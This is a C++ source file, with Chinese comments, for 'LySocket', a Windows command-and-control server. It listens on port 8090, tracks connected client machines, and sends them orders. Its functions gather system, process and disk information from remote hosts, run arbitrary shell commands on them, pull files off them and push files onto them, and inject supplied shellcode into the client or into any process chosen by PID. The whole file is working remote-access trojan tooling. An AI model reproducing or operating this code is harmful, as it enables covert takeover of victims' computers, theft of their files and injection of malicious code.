#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <iostream>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <string>
#include <vector>
#include <boost/tokenizer.hpp>

#pragma comment(lib,"ws2_32.lib")

using namespace std;

typedef struct
{
	SOCKET client;
	sockaddr_in saddr;
	char address[128];
	unsigned short port;
}ClientInfo;

std::vector<ClientInfo *> info;       // 全局主机列表
SOCKET server;                        // 本地套接字
sockaddr_in sai_server;               // 存放服务器IP、端口

// 弹出下线的主机
void PopConnect(std::vector<ClientInfo *> &ptr, char *address)
{
	// 循环迭代器,查找需要弹出的元素
	for (std::vector<ClientInfo *>::iterator it = ptr.begin(); it != ptr.end(); it++)
	{
		ClientInfo *client = *it;

		// 如果找到了,则将其从链表中移除
		if (strcmp(client->address, address) == 0)
		{
			ptr.erase(it);
			// std::cout << "地址: " << client->address << " 已下线" << std::endl;
			return;
		}
	}
}

// 输出当前主机列表
void ShowList(std::vector<ClientInfo *> &ptr)
{
	printf("-------------------------------------------------------------------- \n");
	printf("索引 \t\t 客户端地址 \t\t 端口 \t\t 状态 \n");
	printf("-------------------------------------------------------------------- \n");

	for (int x = 0; x < ptr.size(); x++)
	{
		// 发送Ping信号,探测
		bool ref = send(ptr[x]->client, "Ping", 4, 0);
		if (ref != true)
		{
			printf("%d \t\t %s \t\t %d \t\t Close \n", x, ptr[x]->address, ptr[x]->port);
			PopConnect(info, ptr[x]->address);
			continue;
		}

		// 接收探测信号,看是否存活
		char ref_buf[32] = { 0 };
		recv(ptr[x]->client, ref_buf, 32, 0);
		if (strcmp(ref_buf, "Pong") != 0)
		{
			printf("%d \t\t %s \t\t %d \t\t Close \n", x, ptr[x]->address, ptr[x]->port);
			PopConnect(info, ptr[x]->address);
			continue;
		}
		printf("%d \t\t %s \t\t %d \t\t Open \n", x, ptr[x]->address, ptr[x]->port);
	}

	printf("-------------------------------------------------------------------- \n");
}

// 发送消息
void SendMessageConnect(std::vector<ClientInfo *> &ptr, char *address, char *send_data)
{
	for (int x = 0; x < ptr.size(); x++)
	{
		// 判断是否为需要发送的IP
		if (strcmp(ptr[x]->address, address) == 0)
		{
			// 对选中主机发送数据
			send(ptr[x]->client, send_data, strlen(send_data), 0);
			int error_send = GetLastError();
			if (error_send != 0)
			{
				// 弹出元素
				PopConnect(info, address);
				return;
			}

			// 获取执行结果
			char recv_message[4096] = { 0 };
			recv(ptr[x]->client, recv_message, 4096, 0);
			std::cout << recv_message << std::endl;
		}
	}
}

// -------------------------------------------------------------
// 获取目标主机CPU结构体
// -------------------------------------------------------------
typedef struct
{
	UCHAR szCPU[16];
	UINT uCPUID;
	DWORD idle;
	DWORD kernel;
	DWORD user;
	DWORD cpu;
}CpuInfo;

void RecvCPUMessageConnect(std::vector<ClientInfo *> &ptr, char *address)
{
	printf("-------------------------------------------------------------------- \n");

	for (int x = 0; x < ptr.size(); x++)
	{
		// 判断是否为需要发送的IP
		if (strcmp(ptr[x]->address, address) == 0)
		{
			// 对选中主机发送数据
			send(ptr[x]->client, "GetCPU\n", strlen("GetCPU"), 0);
			int error_send = GetLastError();
			if (error_send != 0)
			{
				// 弹出元素
				PopConnect(info, address);
				return;
			}

			// 获取执行结果
			char recv_message[8192] = { 0 };
			recv(ptr[x]->client, recv_message, sizeof(CpuInfo), 0);
			CpuInfo* info = (CpuInfo*)recv_message;

			std::cout << "CPUID: " << info->uCPUID << std::endl;
			std::cout << "CPU型号: " << info->szCPU << std::endl;
			std::cout << "idle: " << info->idle << std::endl;
			std::cout << "kernel: " << info->kernel << std::endl;
			std::cout << "user: " << info->user << std::endl;
			std::cout << "cpu: " << info->cpu << std::endl;
		}
	}

	printf("-------------------------------------------------------------------- \n");
}

// -------------------------------------------------------------
// 获取内存相关函数
// -------------------------------------------------------------
typedef struct
{
	ULONG Total;
	ULONG Free;
	ULONG Used;
}MemoryInfo;

void RecvMemoryMessageConnect(std::vector<ClientInfo *> &ptr, char *address)
{
	printf("-------------------------------------------------------------------- \n");
	printf("内存总量 \t\t 内存剩余 \t\t 内存已使用 \t\t \n");
	printf("-------------------------------------------------------------------- \n");
	for (int x = 0; x < ptr.size(); x++)
	{
		// 判断是否为需要发送的IP
		if (strcmp(ptr[x]->address, address) == 0)
		{
			// 对选中主机发送数据
			send(ptr[x]->client, "GetMemory\n", strlen("GetMemory"), 0);
			int error_send = GetLastError();
			if (error_send != 0)
			{
				// std::cout << ptr[x]->address << " 已离线" << endl;

				// 弹出元素
				PopConnect(info, address);
				return;
			}

			// 获取执行结果
			char recv_message[8192] = { 0 };
			recv(ptr[x]->client, recv_message, sizeof(MemoryInfo), 0);
			MemoryInfo* info = (MemoryInfo*)recv_message;
			printf("%d MB \t\t %d MB \t\t %d MB \n", info->Total, info->Free, info->Used);
		}
	}
	printf("-------------------------------------------------------------------- \n");
}

// -------------------------------------------------------------
// 获取系统进程列表
// -------------------------------------------------------------
typedef struct
{
	DWORD Is64;
	DWORD PID;
	CHAR ProcessName[2048];
}ProcessList;

void RecvProcessListMessageConnect(std::vector<ClientInfo *> &ptr, char *address)
{
	printf("-------------------------------------------------------------------- \n");
	printf("索引 \t\t 进程PID \t\t 进程位数 \t\t 进程名 \t\t \n");
	printf("-------------------------------------------------------------------- \n");

	for (int x = 0; x < ptr.size(); x++)
	{
		// 判断是否为需要发送的IP
		if (strcmp(ptr[x]->address, address) == 0)
		{
			// 对选中主机发送数据
			send(ptr[x]->client, "GetProcessList\n", strlen("GetProcessList"), 0);
			int error_send = GetLastError();
			if (error_send != 0)
			{
				// 弹出元素
				PopConnect(info, address);
				return;
			}

			// 获取进程数
			DWORD recv_count = 0;
			recv(ptr[x]->client, (char*)&recv_count, sizeof(DWORD), 0);
			// printf("count = %d \n", recv_count);

			// 回应发送成功标志
			send(ptr[x]->client, (char *)&recv_count, sizeof(DWORD), 0);

			// 接收进程数,并打印
			for (int y = 0; y < recv_count; y++)
			{
				char recv_message[sizeof(ProcessList)] = { 0 };

				recv(ptr[x]->client, recv_message, sizeof(ProcessList), 0);

				ProcessList* info = (ProcessList*)recv_message;

				if (info->Is64 == 1)
				{
					printf("%d \t\t %d \t x86 \t\t %s \t\t \n", y, info->PID, info->ProcessName);
				}
				else
				{
					printf("%d \t\t %d \t x64 \t\t %s \t\t \n", y, info->PID, info->ProcessName);
				}
			}
		}
	}
	printf("-------------------------------------------------------------------- \n");
}

// -------------------------------------------------------------
// 获取系统磁盘个数与容量
// -------------------------------------------------------------

// 将字节转换为GB单位显示的宏定义
#define ToGB(x) (x.HighPart << 2) + (x.LowPart >> 20) / 1024.0

// 定义基础结构
typedef struct
{
	double available_space;
	double free_space;
	double total_space;
}DriverInfo;

// 定义完整结构
typedef struct
{
	char driver_name[128];
	char driver_type[128];
	double available_space;
	double free_space;
	double total_space;
}MyDriver;

// 返回数据
void RecvDiskCapacityMessageConnect(std::vector<ClientInfo *> &ptr, char *address)
{
	for (int x = 0; x < ptr.size(); x++)
	{
		// 判断是否为需要发送的IP
		if (strcmp(ptr[x]->address, address) == 0)
		{
			// 对选中主机发送数据
			send(ptr[x]->client, "GetDiskList\n", strlen("GetDiskList"), 0);
			int error_send = GetLastError();
			if (error_send != 0)
			{
				// 弹出元素
				PopConnect(info, address);
				return;
			}

			printf("-------------------------------------------------------------------- \n");
			printf("磁盘名 \t\t 磁盘类型 \t\t 总容量 \t\t 可用空间 \t\t 已使用 \t\t \n");
			printf("-------------------------------------------------------------------- \n");

			// 获取磁盘数
			DWORD recv_count = 0;
			recv(ptr[x]->client, (char*)&recv_count, sizeof(DWORD), 0);
			// printf("count = %d \n", recv_count);

			// 回应发送成功标志
			send(ptr[x]->client, (char *)&recv_count, sizeof(DWORD), 0);

			// 接收数,并打印
			for (int y = 0; y < recv_count; y++)
			{
				char recv_message[sizeof(MyDriver)] = { 0 };

				recv(ptr[x]->client, recv_message, sizeof(MyDriver), 0);

				MyDriver* info = (MyDriver*)recv_message;
				printf("%s \t\t %s \t\t %f \t\t %f \t\t %f \n", info->driver_name,info->driver_type,info->total_space,info->free_space,info->available_space);
			}
		}
	}
	printf("-------------------------------------------------------------------- \n");
}

// -------------------------------------------------------------
// 获取磁盘文件列表
// -------------------------------------------------------------
typedef struct
{
	char szFilePath[4095];
	char szFileName[2048];
	long long szFileSize;
}FileInfo;

void SendRecvDiskFileListMessageConnect(std::vector<ClientInfo *> &ptr, char *address, char *path)
{
	for (int x = 0; x < ptr.size(); x++)
	{
		// 判断是否为需要发送的IP
		if (strcmp(ptr[x]->address, address) == 0)
		{
			// 对选中主机发送数据
			send(ptr[x]->client, "GetDiskFileList\n", strlen("GetDiskFileList"), 0);
			int error_send = GetLastError();
			if (error_send != 0)
			{
				// 弹出元素
				PopConnect(info, address);
				return;
			}

			// 发送用户命令
			DWORD send_count = 0;
			char SendPath[8192] = { 0 };
			strcpy(SendPath, path);
			send(ptr[x]->client, SendPath, 8192, 0);
			// printf("发送输出的目录地址: %s \n", path);

			// 获取文件计数
			DWORD recv_count = 0;
			recv(ptr[x]->client, (char*)&recv_count, sizeof(DWORD), 0);
			// printf("计数器 = %d \n", recv_count);

			// 回应发送成功标志
			send(ptr[x]->client, (char *)&recv_count, sizeof(DWORD), 0);

			printf("-------------------------------------------------------------------- \n");
			printf("文件名 \t\t\t\t 文件大小 \n");
			printf("-------------------------------------------------------------------- \n");

			// 接收数,并打印
			for (int y = 0; y < recv_count; y++)
			{
				char recv_message[sizeof(FileInfo)] = { 0 };

				recv(ptr[x]->client, recv_message, sizeof(FileInfo), 0);

				FileInfo* info = (FileInfo*)recv_message;

				printf("%-40s \t\t %d \n", info->szFileName, info->szFileSize);
			}
		}
	}
	printf("-------------------------------------------------------------------- \n");
}

// -------------------------------------------------------------
// 匿名管道执行CMD部分
// -------------------------------------------------------------

void SendRecvCommandMessageConnect(std::vector<ClientInfo *> &ptr, char *address, char *cmd)
{
	for (int x = 0; x < ptr.size(); x++)
	{
		// 判断是否为需要发送的IP
		if (strcmp(ptr[x]->address, address) == 0)
		{
			// 对选中主机发送数据
			send(ptr[x]->client, "GetCommand\n", strlen("GetCommand"), 0);
			int error_send = GetLastError();
			if (error_send != 0)
			{
				// 弹出元素
				PopConnect(info, address);
				return;
			}


			// 发送用户命令
			DWORD send_count = 0;
			char SendCmd[8192] = { 0 };
			char RecvCmd[8192] = { 0 };

			strcpy(SendCmd, cmd);
			send(ptr[x]->client, SendCmd, 8192, 0);
			// printf("发送输出的目录地址: %s \n", path);

			// 获取文件计数
			recv(ptr[x]->client, RecvCmd, sizeof(RecvCmd), 0);
			// printf("计数器 = %d \n", recv_count);

			printf("%s \n", RecvCmd);

		}
	}
	printf("-------------------------------------------------------------------- \n");
}

// -------------------------------------------------------------
// 发送接收文件部分
// -------------------------------------------------------------

// 传入路径得到文件名
char* GetFileName(char* Path)
{
	if (strchr(Path, '\\'))
	{
		char ch = '\\';
		char* ref = strrchr(Path, ch) + 1;
		return ref;
	}
	else
	{
		char ch = '/';
		char* ref = strrchr(Path, ch) + 1;
		return ref;
	}
}

// 获取文件大小
int GetFileSize(std::string FileName)
{
	FILE* pointer = NULL;
	pointer = fopen(FileName.c_str(), "rb");
	if (pointer != NULL)
	{
		fseek(pointer, 0, SEEK_END);
		int size = ftell(pointer);
		fclose(pointer);
		return size;
	}
	return 0;
}

// 接收文件
bool RecvFile(SOCKET ptr, char* LocalPath, char* RemoteFile)
{
	// 发送需要下载的文件路径
	send(ptr, RemoteFile, strlen(RemoteFile), 0);

	// 接收文件长度
	long long file_size = 0;
	recv(ptr, (char*)&file_size, sizeof(int), 0);
	if (file_size <= 0)
	{
		return false;
	}

	// 保存文件到指定目录下
	char *file_name = GetFileName(RemoteFile);
	char file_all_name[1024] = { 0 };

	strcat(file_all_name, LocalPath);
	strcat(file_all_name, file_name);

	std::cout << "[+] 生成保存路径: " << file_all_name << std::endl;
	FILE* pointer = fopen(file_all_name, "wb");
	char buffer[1024] = { 0 };

	if (pointer != NULL)
	{
		long long length = 0;
		long long total_length = 0;

		// 循环接收字节数据,每次接收1024字节
		while ((length = recv(ptr, buffer, 1024, 0)) > 0)
		{
			// 写出文件并判断是否写出成功
			if (fwrite(buffer, sizeof(char), length, pointer) < length)
			{
				break;
			}

			// 每次累加递增
			total_length += length;
			memset(buffer, 0, 1024);

			// 判断文件长度是否全部接收完毕
			if (total_length >= file_size)
			{
				std::cout << "[+] 文件接收完毕, 接收字节数: " << total_length << std::endl;
				fclose(pointer);
				return true;
			}
		}
		fclose(pointer);
	}
	return false;
}


// 发送指定文件
bool SendFile(SOCKET ptr)
{
	// 接收文件路径
	char file_path[1024] = { 0 };
	recv(ptr, file_path, 1024, 0);

	// 得到文件长度并发送给服务端
	long long file_size = GetFileSize(file_path);

	if (file_size <= 0)
	{
		return false;
	}
	send(ptr, (char*)&file_size, sizeof(int), 0);
	std::cout << "[+] 发送文件长度: " << file_size << std::endl;

	// 循环发送数据
	char buffer[1024] = { 0 };
	FILE* pointer = fopen(file_path, "rb");
	if (pointer != NULL)
	{
		long long length = 0;
		long long total_length = 0;

		// 循环发送数据
		while ((length = fread(buffer, sizeof(char), 1024, pointer)) > 0)
		{
			send(ptr, buffer, length, 0);
			memset(buffer, 0, 1024);
			total_length += length;
		}

		if (total_length == file_size)
		{
			return true;
		}
	}
	return false;
}

// 接收文件方法
void RecvFileConnect(std::vector<ClientInfo *> &ptr, char *address, char *src, char *dst)
{
	for (int x = 0; x < ptr.size(); x++)
	{
		// 判断是否为需要发送的IP
		if (strcmp(ptr[x]->address, address) == 0)
		{
			// 对选中主机发送数据
			send(ptr[x]->client, "RecvFile\n", strlen("RecvFile"), 0);
			int error_send = GetLastError();
			if (error_send != 0)
			{
				// 弹出元素
				PopConnect(info, address);
				return;
			}

			// 接收远程 src 放到本地的 dst 目录下
			bool ref = RecvFile(ptr[x]->client, dst, src);
			std::cout << "[*] 接收状态: " << ref << std::endl;
		}
	}
}

// 发送文件方法
void SendFileConnect(std::vector<ClientInfo *> &ptr, char *address, char *src, char *dst)
{
	typedef struct
	{
		CHAR LocalPath[4096];
		CHAR RemotePath[4096];
	}SendFilePath;

	for (int x = 0; x < ptr.size(); x++)
	{
		// 判断是否为需要发送的IP
		if (strcmp(ptr[x]->address, address) == 0)
		{
			// 对选中主机发送数据
			send(ptr[x]->client, "SendFile\n", strlen("SendFile"), 0);
			int error_send = GetLastError();
			if (error_send != 0)
			{
				// 弹出元素
				PopConnect(info, address);
				return;
			}

			// 发送文件名
			SendFilePath file_path = { 0 };
			char send_message[sizeof(SendFilePath)] = { 0 };

			strcpy(file_path.LocalPath, src);
			strcpy(file_path.RemotePath, dst);
			
			memcpy(send_message, &file_path, sizeof(SendFilePath));

			// 发送数据
			send(ptr[x]->client, send_message, sizeof(SendFilePath), 0);

			// 接收远程 src 放到本地的 dst 目录下
			bool ref = SendFile(ptr[x]->client);
			std::cout << "[*] 接收状态: " << ref << std::endl;
		}
	}
}

// -------------------------------------------------------------
// 代码注入部分
// -------------------------------------------------------------

typedef struct
{
	DWORD PID;
	char ShellCode[4096];
}InjectCode;

// 注入代码到远程自身进程内
void SendInjectSelfCode(std::vector<ClientInfo *> &ptr, char *address, char* shellcode)
{
	for (int x = 0; x < ptr.size(); x++)
	{
		// 判断是否为需要发送的IP
		if (strcmp(ptr[x]->address, address) == 0)
		{
			// 对选中主机发送数据
			send(ptr[x]->client, "InjectSelfCode\n", strlen("InjectSelfCode"), 0);
			int error_send = GetLastError();
			if (error_send != 0)
			{
				// 弹出元素
				PopConnect(info, address);
				return;
			}

			InjectCode send_shellcode = { 0 };

			send_shellcode.PID = 0;
			strcpy(send_shellcode.ShellCode, shellcode);

			char send_buffer[8192] = { 0 };
			memcpy(send_buffer, &send_shellcode, sizeof(InjectCode));
			send(ptr[x]->client, send_buffer, sizeof(InjectCode), 0);
		}
	}
}

// 注入shellcode到远程进程内
void SendInjectRemoteCode(std::vector<ClientInfo *> &ptr, char *address, DWORD pid, char* shellcode)
{
	for (int x = 0; x < ptr.size(); x++)
	{
		// 判断是否为需要发送的IP
		if (strcmp(ptr[x]->address, address) == 0)
		{
			// 对选中主机发送数据
			send(ptr[x]->client, "InjectRemoteCode\n", strlen("InjectRemoteCode"), 0);
			int error_send = GetLastError();
			if (error_send != 0)
			{
				// 弹出元素
				PopConnect(info, address);
				return;
			}

			InjectCode send_shellcode = { 0 };

			send_shellcode.PID = pid;
			strcpy(send_shellcode.ShellCode, shellcode);

			char send_buffer[8192] = { 0 };
			memcpy(send_buffer, &send_shellcode, sizeof(InjectCode));
			send(ptr[x]->client, send_buffer, sizeof(InjectCode), 0);
		}
	}
}

// 建立套接字
void EstablishConnect()
{
	while (1)
	{
		ClientInfo* cInfo = new ClientInfo();
		int len_client = sizeof(sockaddr);

		cInfo->client = accept(server, (sockaddr*)&cInfo->saddr, &len_client);

		// 填充主机地址和端口
		char array_ip[20] = { 0 };

		inet_ntop(AF_INET, &cInfo->saddr.sin_addr, array_ip, 16);
		strcpy(cInfo->address, array_ip);
		cInfo->port = ntohs(cInfo->saddr.sin_port);

		info.push_back(cInfo);
	}
}

int main(int argc, char* argv[])
{
	// 初始化 WSA ，激活 socket
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	// 初始化 socket、服务器信息
	server = socket(AF_INET, SOCK_STREAM, 0);
	sai_server.sin_addr.S_un.S_addr = 0;    // IP地址
	sai_server.sin_family = AF_INET;        // IPV4
	sai_server.sin_port = htons(8090);        // 传输协议端口

	// 本地地址关联套接字
	if (bind(server, (sockaddr*)&sai_server, sizeof(sai_server)))
	{
		WSACleanup();
	}

	// 套接字进入监听状态
	listen(server, SOMAXCONN);

	// 建立子线程实现侦听连接
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)EstablishConnect, 0, 0, 0);

	std::string command = {};

	while (1)
	{
		std::cout << "[ LySocket ] # ";
		std::getline(std::cin, command);

		if (command.length() == 0)
		{
			continue;
		}
		else if (command == "help")
		{
			printf(" _            ____             _        _   \n");
			printf("| |   _   _  / ___|  ___   ___| | _____| |_  \n");
			printf("| |  | | | | \\___ \\ / _ \\ / __| |/ / _ \\ __| \n");
			printf("| |__| |_| |  ___) | (_) | (__|   <  __/ |_  \n");
			printf("|_____\\__, | |____/ \\___/ \\___|_|\\_\\___|\\__| \n");
			printf("      |___/                                 \n\n");
			printf("Usage: LySocket version 1.3.0 \n");
			printf("Email: me@lyshark.com \n");
			printf("Optional: \n\n");
			printf("\t ShowSocket        输出所有上线客户端 \n");
			printf("\t GetCPU            获取客户端CPU数据 \n");
			printf("\t GetMemory         获取客户端内存数据 \n");
			printf("\t GetProcessList    获取客户端正在运行进程列表 \n");
			printf("\t GetDiskList       获取客户端磁盘列表 \n");
			printf("\t GetDiskFileList   获取磁盘特定路径文件列表 \n");
			printf("\t GetCommand        执行系统命令并返回值 \n");
			printf("\t SendFile          将本地文件传输到远程 \n");
			printf("\t RecvFile          将远程文件拉取到本地 \n");
			printf("\t InjectSelfCode    将ShellCode注入到客户端内 \n");
			printf("\t InjectRemoteCode  将ShellCode注入到客户端指定进程内 \n");
			printf("\t CloseServer       正常退出服务端 \n");
			printf("\t Exit              退出远程客户端 \n\n");
		}
		else
		{
			// 定义分词器: 定义分割符号为[逗号,空格]
			boost::char_separator<char> sep(", --");
			typedef boost::tokenizer<boost::char_separator<char>> CustonTokenizer;
			CustonTokenizer tok(command, sep);

			// 将分词结果放入vector链表
			std::vector<std::string> vecSegTag;
			for (CustonTokenizer::iterator beg = tok.begin(); beg != tok.end(); ++beg)
			{
				vecSegTag.push_back(*beg);
			}
			// 解析 [shell] # ShowSocket
			if (vecSegTag.size() == 1 && vecSegTag[0] == "ShowSocket")
			{
				ShowList(info);
			}

			// 解析 [shell] # GetCPU --address 127.0.0.1
			if (vecSegTag.size() == 3 && vecSegTag[0] == "GetCPU")
			{
				char *address = (char *)vecSegTag[2].c_str();
				RecvCPUMessageConnect(info, address);

			}

			// 解析 [shell] # GetMemory --address 127.0.0.1
			if (vecSegTag.size() == 3 && vecSegTag[0] == "GetMemory")
			{
				char* address = (char*)vecSegTag[2].c_str();
				RecvMemoryMessageConnect(info, address);
			}

			// 解析 [shell] # GetProcessList --address 127.0.0.1
			if (vecSegTag.size() == 3 && vecSegTag[0] == "GetProcessList")
			{
				char* address = (char*)vecSegTag[2].c_str();
				RecvProcessListMessageConnect(info, address);
			}

			// 解析 [shell] # GetDiskList --address 127.0.0.1
			if (vecSegTag.size() == 3 && vecSegTag[0] == "GetDiskList")
			{
				char* address = (char*)vecSegTag[2].c_str();
				RecvDiskCapacityMessageConnect(info, address);
			}

			// 解析 [shell] # GetDiskFileList --address 127.0.0.1 --path d://
			if (vecSegTag.size() == 5 && vecSegTag[0] == "GetDiskFileList")
			{
				char* address = (char*)vecSegTag[2].c_str();
				char* path = (char*)vecSegTag[4].c_str();

				SendRecvDiskFileListMessageConnect(info, address, path);
				printf("[+] Success.. \n");
			}

			// 解析 [shell] # GetCommand --address 127.0.0.1 --cmd ipconfig
			if (vecSegTag.size() == 5 && vecSegTag[0] == "GetCommand")
			{
				char* address = (char*)vecSegTag[2].c_str();
				char* cmd = (char*)vecSegTag[4].c_str();

				SendRecvCommandMessageConnect(info, address, cmd);
				printf("[+] Success.. \n");
			}

			// 解析 [shell] # InjectSelfCode --address 127.0.0.1 --shellcode 1ec2374894395482
			if (vecSegTag.size() == 5 && vecSegTag[0] == "InjectSelfCode")
			{
				char* address = (char*)vecSegTag[2].c_str();
				char* shellcode = (char*)vecSegTag[4].c_str();

				SendInjectSelfCode(info, address, shellcode);
				printf("[+] Success.. \n");
			}

			// 解析 [shell] # InjectRemoteCode --address 127.0.0.1 --pid 1234 --shellcode 1ec2374894395482
			if (vecSegTag.size() == 7 && vecSegTag[0] == "InjectRemoteCode")
			{
				char* address = (char*)vecSegTag[2].c_str();
				char * pid = (char *)vecSegTag[4].c_str();
				char* shellcode = (char*)vecSegTag[6].c_str();

				SendInjectRemoteCode(info, address, atoi(pid), shellcode);
				printf("[+] Success.. \n");
			}

			// 解析 [shell] # RecvFile --address 127.0.0.1 --src d://dd.exe --dst d://11g/
			if (vecSegTag.size() == 7 && vecSegTag[0] == "RecvFile")
			{
				char* address = (char*)vecSegTag[2].c_str();
				char * src = (char *)vecSegTag[4].c_str();
				char* dst = (char*)vecSegTag[6].c_str();

				RecvFileConnect(info, address, src, dst);
				printf("[+] Success.. \n");
			}

			// 解析 [shell] # SendFile --address 127.0.0.1 --src d://dd.exe --dst d://11g/
			if (vecSegTag.size() == 7 && vecSegTag[0] == "SendFile")
			{
				char* address = (char*)vecSegTag[2].c_str();
				char * src = (char *)vecSegTag[4].c_str();
				char* dst = (char*)vecSegTag[6].c_str();

				SendFileConnect(info, address, src, dst);
				printf("[+] Success.. \n");
			}

			// 解析 [shell] # Exit --address 127.0.0.1
			if (vecSegTag.size() == 3 && vecSegTag[0] == "Exit")
			{
				char* address = (char*)vecSegTag[2].c_str();
				SendMessageConnect(info, address, "Exit");
			}

			// 解析 [shell] # CloseServer
			if (vecSegTag.size() == 1 && vecSegTag[0] == "CloseServer")
			{
				for (int x = 0; x < info.size(); x++)
				{
					// 全部发送关闭信号
					SendMessageConnect(info, info[x]->address, "CloseServer");
				}
				closesocket(server);
				WSACleanup();
				break;
				return 0;
			}
		}
	}
	return 0;
}